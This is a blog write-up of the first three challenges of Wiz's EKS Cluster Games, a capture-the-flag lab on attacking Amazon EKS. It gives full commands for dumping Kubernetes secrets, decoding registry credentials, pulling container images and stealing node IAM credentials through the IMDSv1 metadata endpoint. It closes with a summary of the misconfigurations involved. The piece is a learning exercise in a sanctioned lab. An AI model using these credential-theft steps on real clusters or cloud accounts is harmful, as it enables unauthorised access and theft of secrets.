---
layout: post
title:  "Wiz’s EKS Cluster Games: What I Learned (Part 1)"
date:   2024-02-27 09:30:00 -0400
categories: technical aws
image: /assets/img/wiz-eks-challenge-1/wiz-eks-1-header.png
---

*Learning from Wiz’s EKS Cluster Games in AWS.*

Last November, the Wiz team released the EKS Cluster Games for practice attacking Amazon Elastic Kubernetes Service (EKS) environments. I had a blast with their previous IAM Challenge! I saw this as a great opportunity to continue learning in areas I’m less familiar with, and it absolutely delivered.

For this first post, I'll be sharing my notes from the first three challenges:

- Challenge 1: Access to Cluster Secrets ("Secret Seeker")
- Challenge 2: Secrets in Pod Config & Sensitive Image Data ("Registry Hunt")
- Challenge 3: IMDS Credential Access & Secrets in Image Configuration ("Image Inquisition")
- Challenge 4: *Upcoming*
- Challenge 5: *Upcoming*

If you’re up for following along, the challenge is here:

>[The EKS Cluster Games!!](https://eksclustergames.com/) No account required to play.
{: .prompt-tip }

You’ll have a cloud shell to play with in browser, and no local tools are needed. What are you waiting for? :)

I’d like to call out notable resources from smarter folks that helped me work through these challenges: CyberArk’s general series on Kubernetes Pentesting ([1](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1), [2](https://www.cyberark.com/resources/conjur-secrets-manager-enterprise/kubernetes-pentest-methodology-part-2), [3](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3)), and [Matt Moyer’s](https://moyer.dev/blog/eks-cluster-games-challenge-1/) and [Skybound’s](https://www.skybound.link/2023/11/eks-cluster-games-challenge/) super-helpful writeups for when I really got stuck.

Last but not least, a huge thanks to Wiz for desigining and hosting this challenge!! These are always a blast to work on.

## Challenge 1: Access to Cluster Secrets

### Summary

Challenge #1 demonstrated an initial user with access to list secrets in the cluster. Reviewing available secrets with `kubectl get secrets` and accessing the `log-rotate` secret with base64 decoding revealed the first flag!

### Details

Each challenge provides a hint on how the cluster’s configuration can be used to find the flag and get to the next level. 

The hint in this case:

![challenge-1-hint.png](/assets/img/wiz-eks-challenge-1/challenge-1-hint.png)

Under “View Permissions”, policy showed that the initial account should have the ability to “get” and “list” secrets:

```json
{
    "secrets": [
        "get",
        "list"
    ]
}
```

For some context before starting, the user identity can be verified like so:

```bash
root@wiz-eks-challenge:~# kubectl whoami
system:serviceaccount:challenge1:service-account-challenge1
```

Since the account also has the ability to perform SelfSubjectAccessReviews, the ability to “get” and “list” resources can also be viewed with `kubectl auth can-i --list`:

```bash
root@wiz-eks-challenge:~# kubectl auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                      Non-Resource URLs   Resource Names   Verbs
selfsubjectaccessreviews[...]  []                  []               [create]
selfsubjectrulesreviews[...]   []                  []               [create]
secrets                        []                  []               [get list]
[...]
```

`kubectl get secrets` can be used to review what secrets are present:

```bash
root@wiz-eks-challenge:~# kubectl get secrets
NAME         TYPE     DATA   AGE
log-rotate   Opaque   1      17d
```

The full details of this `log-rotate` secret shows a “flag” entry under “data”. In this case, specifying the secret name and an output format with `-o` will ensure secret contents are dumped (instead of a general description of the secret!):

```bash
root@wiz-eks-challenge:~# kubectl get secret log-rotate -o json
{
    "apiVersion": "v1",
    "data": {
        "flag": "d2l6X[...]XNzfQ=="
    },
    "kind": "Secret",
    "metadata": {
        "creationTimestamp": "2023-11-01T13:02:08Z",
        "name": "log-rotate",
        "namespace": "challenge1",
        "resourceVersion": "890951",
        "uid": "03f6372c-b728-4c5b-ad28-70d5af8d387c"
    },
    "type": "Opaque"
}
```

Decoding the secret with `| base64 -d` reveals the flag!

```bash
root@wiz-eks-challenge:~# echo -n "d2l6X[...]XNzfQ==" | base64 -d
wiz_eks_challenge{FLAG-CONTENTS}
```

We'll cover some more elegant ways to handle json in the next challenge.

For some more background on this issue, check [CyberArk's Kuberenetes Pentest Methodology Part 1](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1): “Listing Secrets”.

## Challenge 2: Secrets in Pod Config & Sensitive Image Data

### Summary

Challenge #2 contained a pod with details containing the identity of a secret that could be fetched and used to access an image containing the flag:

1. Pod configuration details from `kubectl get pod` exposed the identity of a secret that could be fetched with `kubectl get secret`. 
2. This secret could be used to authenticate to the container registry to list images and compress and pull the container image `eksclustergames/base_ext_image` via Crane.
3. Decompressing the image revealed the second flag in the image's files.

### Details

#### ***Identifying Pod Secrets***

In Challenge #2, the ability to list secrets was removed - but the ability to list and get pods was added:

```json
{
    "secrets": [
        "get"
    ],
    "pods": [
        "list",
        "get"
    ]
}
```

The following tantalizing hint was also dropped:

> *“Registry Hunt: A thing we learned during our research: always check the container registries. For your convenience, the **[crane](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md)** utility is already pre-installed on the machine.”*
> 

Listing the pods shows one pod running:

```bash
root@wiz-eks-challenge:~# kubectl get pods
NAME                    READY   STATUS    RESTARTS   AGE
database-pod-2c9b3a4e   1/1     Running   0          17d
```

Listing the details of this pod with `kubectl get pod` provides a *lot* of detail. Trimmed contents for emphasis on key areas below:

```bash
root@wiz-eks-challenge:~# kubectl get pod database-pod-2c9b3a4e -o json
{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
        [...]
        "creationTimestamp": "2023-11-01T13:32:05Z",
        "name": "database-pod-2c9b3a4e",
        "namespace": "challenge2",
        "resourceVersion": "12166896",
        "uid": "57fe7d43-5eb3-4554-98da-47340d94b4a6"
    },
    "spec": {
        [...]
        "imagePullSecrets": [
            {
                "name": "registry-pull-secrets-780bab1d"
            }
        ],
        [...]
        "containerStatuses": [
            {
                "containerID": "containerd://8010fe76a2bcad0d49b7d810efd7afdecdf00815a9f5197b651b26ddc5de1eb0",
                "image": "docker.io/eksclustergames/base_ext_image:latest",
                "imageID": "docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623",
                [...]
            }
        ],
[...]
    }
}
```

See that? Under “`imagePullSecrets`”, there’s a secret name “`registry-pull-secrets-780bab1d`”. There’s also an interesting reference to the name of the image this pod was created from: “`docker.io/eksclustergames/base_ext_image:latest`”. From details on pulling images from private registries ([Kubernetes, "Pull an Image from a Private Registry"](https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/)), we’ll likely both of these to recover an image with Crane.

While we can't list secrets, with a known secret name and the ability to get secrets this secret can be recovered with `kubectl get secret`:

```bash
root@wiz-eks-challenge:~# kubectl get secret registry-pull-secrets-780bab1d -o json                  
{
    "apiVersion": "v1",
    "data": {
        ".dockerconfigjson": "eyJh[...]fX19"
    },
    "kind": "Secret",
    "metadata": {
		[...]
    },
    "type": "kubernetes.io/dockerconfigjson"
}
```

#### ***Decoding Pod Secrets***

To take a “quick & dirty” look at these contents, copying and pasting the base64 encoded contents from `data` with a pipe to `base64 -d` shows even *more* encoded data:

```bash
root@wiz-eks-challenge:~# echo -n "eyJh[...]fX19" | base64 -d
{"auths": {"index.docker.io/v1/": {"auth": "ZWtz[...]VDbw=="}}}
```

And continuing on, copying and pasting the newly revealed data results in a set of login credentials:

```bash
root@wiz-eks-challenge:~# echo -n "ZWtz[...]VDbw==" | base64 -d
eksclustergames:dckr_pat_Ytnc[...]FuCo
```

This recovers the secret… but at what [CTRL-C]ost? 🫠

#### ***Fetching Pod Secrets, Improved***

That was a lot of copy-pastes in the heat of the moment for what probably could’ve been handled elegantly in JSON. Redoing this with `jq` seems like a good move at this point, to reduce manual steps if we ever need to fetch a secret like this again.

Reviewing our previous work, the following steps need to be handled by `jq`:

1. Accessing the initial secret field (`.data[]`)
2. Base64 decoding it (`@base64d`, a nifty built-in decoder in `jq`)
3. Transforming the base64 decoded result *back into* JSON for `jq` to process (`fromjson`)
4. Accessing the secondary field within that JSON (`.auths[].auth`)
5. Base64 decoding the resulting field (`@base64d`)

Putting all these pieces together:

```bash
root@wiz-eks-challenge:~# kubectl get secret registry-pull-secrets-780bab1d -o json \
| jq -r '.data[] | @base64d | fromjson | .auths[].auth | @base64d' 
eksclustergames:dckr_pat_Ytnc[...]FuCo         
```

Much more elegant!

Note: `jq` addressing of fields like `.data[]` could be made more specific using `.data[".dockerconfigjson"]`, as opposed to the more general “whatever’s inside” approach of empty square-brackets `[]`.

#### ***Recovering & Decompressing Image Files***

The Wiz team left a hint related to Crane. From some [online digging](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md) into this tool, Crane provides tools to manage images in a repository, such as pushing and pulling images, similar to those provided by Docker. This seems helpful for recovering images!

Now that credentials have been found from our above decoding work, we can use these credentials with `crane auth login` as `eksclustergames`:

```bash
root@wiz-eks-challenge:~# crane auth login docker.io -u eksclustergames -p dckr_pat_Ytnc[...]FuCo 
2023/12/15 21:23:55 logged in via /home/user/.docker/config.json
```

Since Crane will recover a compressed file, we can use `crane pull` on the previously identified image file to `/tmp/` (where we have write permissions) to recover the image:

```bash
root@wiz-eks-challenge:~# crane pull eksclustergames/base_ext_image /tmp/test.tar
```

Decompressing the image via `tar -xvf` extracts image contents, which include additional compressed files:

```bash
root@wiz-eks-challenge:~# tar -xvf /tmp/test.tar 
sha256:add093cd268deb7817aee1887b620628211a04e8733d22ab5c910f3b6cc91867
3f4d90098f5b5a6f6a76e9d217da85aa39b2081e30fa1f7d287138d6e7bf0ad7.tar.gz
193bf7018861e9ee50a4dc330ec5305abeade134d33d27a78ece55bf4c779e06.tar.gz
manifest.json
```

A quick Bash loop will list all directories within the main `.tar` file, create a folder for each, and expand each directory into its own subdirectory:

```bash
root@wiz-eks-challenge:/tmp# for t in $(ls *.tar.gz | cut -d. -f1); do mkdir $t; tar -xvf $t.tar.gz -C $t; done
etc/
flag.txt
proc/
```

While expanding the inner files, a list of all expanded filenames shows `flag.txt`. Accessing that file reveals the flag:

```bash
root@wiz-eks-challenge:~/test# cat 193bf7018861e9ee50a4dc330ec5305abeade134d33d27a78ece55bf4c779e06/flag.txt 
wiz_eks_challenge{FLAG-CONTENTS}
```

## Challenge 3: IMDS Credential Access & Secrets in Image Configuration

### Summary

Challenge #3 demonstrates additional image secret exposure, this time using Instance Metadata Service (IMDS) credential exposure to ultimately access image an configuration variable that contained the flag:

1. IMDS credential exposure allows theft of credentials and impersonation of the `NodeInstanceRole`.
2. The `NodeInstanceRole` can be used to obtain the ECR login password.
3. This password can then be used with Crane to authenticate to the image registry and access a secret in a run config variable.

### Details

For Challenge #3, the following hint is provided:
> *Image Inquisition: A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret. Remember: You are running inside a compromised EKS pod. For your convenience, the crane utility is already pre-installed on the machine.*

Additionally, the following permissions are provided:
```json
{
    "pods": [
        "list",
        "get"
    ]
}
```
No more direct way to list secrets!

#### ***IMDS Credential Access***

After some fumbling around, access to the IMDS endpoint `/iam/security-credentials/` appears to be unauthenticated in this challenge. This would indicate use of the Instance Metadata Service (IMDS) v1, which does not include authentication ([Introduction to the Instance Metadata Service](https://hackingthe.cloud/aws/general-knowledge/intro_metadata_service/)).

We can use this service to query existing accounts, and recover credentials of associated IAM roles and users. A check for available roles associated with this service results in one name:

```bash
root@wiz-eks-challenge:~# curl 169.254.169.254/latest/meta-data/iam/security-credentials/
eks-challenge-cluster-nodegroup-NodeInstanceRole
```

IMDSv1 does not require an existing session token for access to this information. 

Knowing the name of this role, security credential details for the role can be accessed through the IMDS endpoint `/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole`:

```bash
root@wiz-eks-challenge:~# curl 169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole | jq .
[...]
{
  "AccessKeyId": "ASIA[...]QFWT",
  "Expiration": "2023-11-27 22:41:12+00:00",
  "SecretAccessKey": "AyjF[...]9f+H",
  "SessionToken": "FwoG[...]hzjF"
}
```

These IAM credentials can be assigned in our current session using ‘`export`’ to assign the AccessKeyID (`AWS_ACCESS_KEY_ID`), SecretAccessKey (`AWS_SECRET_ACCESS_KEY`), and SessionToken (`AWS_SESSION_TOKEN`) to corresponding environment variables:

```bash
export AWS_ACCESS_KEY_ID="ASIA[...]QFWT"
export AWS_SECRET_ACCESS_KEY="AyjF[...]9f+H"
export AWS_SESSION_TOKEN="FwoG[...]hzjF"
```

Prior to credential assignment, our session has no identity as verified by `aws sts get-caller-identity`:

```bash
root@wiz-eks-challenge:~# aws sts get-caller-identity
Unable to locate credentials. You can configure credentials by running "aws configure".
```

Following assignment, the `NodeInstanceRole` is associated with our session (under `Arn`):

```bash
root@wiz-eks-challenge:~# aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
```

#### ***Permissions of Compromised Role***

Determining permissions of an IAM user or role can be difficult, given there is no straightforward way to verify permissions outside of brute-forcing them ([Brute Force IAM Permissions](https://hackingthe.cloud/aws/enumeration/brute_force_iam_permissions/)).

However, given the context of the challenge and that we will need a credential to authenticate to a repository using Crane as in the previous challenge, this would relate to AWS Elastic Container Registry (ECR). Based on this, it’s worth trying `aws ecr get-login-password`:

```bash
root@wiz-eks-challenge:~# aws ecr get-login-password 
eyJw[...]2MzR9
```

This credential can be assigned to a variable and used to authenticate Crane:
```bash
root@wiz-eks-challenge:~# pass=$(aws ecr get-login-password)
root@wiz-eks-challenge:~# crane auth login -u AWS -p $(echo $pass) 688655246681.dkr.ecr.us-west-1.amazonaws.com\
```

I’d like to be transparent here that while this could be guessable given the challenge, I certainly didn’t guess it! I needed some guidance from Matt Moyer’s writeups to get to this (after much smashing of my head into the wall), as I hadn't worked much with ECR before.

#### ***Recovering Image Files & Configuration***

With an active Crane session established, we now need details of where to find an image to review. 

A good start is reviewing pods and pod details, which the session still has permissions to perform:

```bash
root@wiz-eks-challenge:~# kubectl get pods
NAME                      READY   STATUS    RESTARTS   AGE
accounting-pod-876647f8   1/1     Running   0          26d

root@wiz-eks-challenge:~# kubectl get pod accounting-pod-876647f8 -o json
{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
        "annotations": {
            "kubernetes.io/psp": "eks.privileged",
            "pulumi.com/autonamed": "true"
        },
        [...]
    },
    "spec": {
        "containers": [
            {
                "image": "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01",
                "imagePullPolicy": "IfNotPresent",
                "name": "accounting-container",
                [...]
                "volumeMounts": [
                    {
                        "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount",
                        "name": "kube-api-access-mmvjj",
                        "readOnly": true
                    }
                ]
            }
        ],
        [...]
    }
}
```

There's an image name referenced in this, that can be more directly accessed with `| jq -r ‘.spec.containers[].image’`:

```bash
kubectl get pod accounting-pod-876647f8 -o json | jq -r '.spec.containers[].image'
688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
```

As before, the image can be fetched using Crane to review:

```bash
root@wiz-eks-challenge:~# crane pull 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 test.tar
```

However, the files of these images don’t yield a flag.

Another aspect of ECR review I learned about while investigating this was reviewing configuration variables for the image provided ([crane config](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane_config.md)). In this case, `crane config` revealed a set of variables in ‘`.history[].created_by`’ :

```bash
root@wiz-eks-challenge:~# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 | jq .
{
  "architecture": "amd64",
  "config": {
   [...]
  },
  "created": "2023-11-01T13:32:07.782534085Z",
  "history": [
    [...]
    },
    {
      "created": "2023-11-01T13:32:07.782534085Z",
      "created_by": "RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{FLAG-CONTENTS} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    [...]
    ]
  }
}
```

Reviewing only this variable, the ‘`created_by`’ seems to contain a set of variables for Artifactory that contains the flag ‘`ARTIFACTORY_TOKEN=wiz_eks_challenge{`’:

```bash
root@wiz-eks-challenge:~# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 | jq -r '.history[].created_by'
/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / 
/bin/sh -c #(nop)  CMD ["sh"]
RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{FLAG-CONTENTS} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit
CMD ["/bin/sleep" "3133337"]
```

## Conclusion

To summarize the security issues covered in these first three challenges:

#### Challenge #1: Access to Cluster Secrets

- **Permission to ‘get’ &  ‘list’ Secrets Granted to ServiceAccount:** Allowing the ServiceAccount permissions to review and recover secrets allowed access to sensitive data after initial access, in this case the flag stored in secrets.

#### Challenge #2: Secrets in Pod Config & Sensitive Image Data

- **Permission to ‘list’ & ‘get’ Pod Details Granted to ServiceAccount:** Allowing the ServiceAccount to review details of pods led to identification of a secret’s location, undermining the removed ‘list’ secrets permission.
- **Permission to ‘get’ Secrets Granted to ServiceAccount:** The ServiceAccount was able to access secrets in known locations, allowing recovery of a secret to access an image repository.
- **Sensitive File in Image:** A recovered image from the compromised image repository contained sensitive data, in this case the flag file.

#### Challenge #3: IMDS Credential Access & Secrets in Image Configuration

- **IMDSv1 Allowing ‘NodeInstanceRole’ Credential Exposure:** Use of the Instance Metadata Service (IMDS) v1 meant that no authentication was in place for calls to the metadata service. This allowed recovery of credentials from the metadata service, and use of these credentials to fetch credentials for an image repository.
- **Sensitive Variable in Image Configuration:** A configuration variable for an image in the compromised image repository contained the flag.

Thanks for joining me on this! I'm hoping this helped you pick something up about EKS, jq, or security in general. I’ll be working on my notes for Challenges #4 & #5 in Part 2.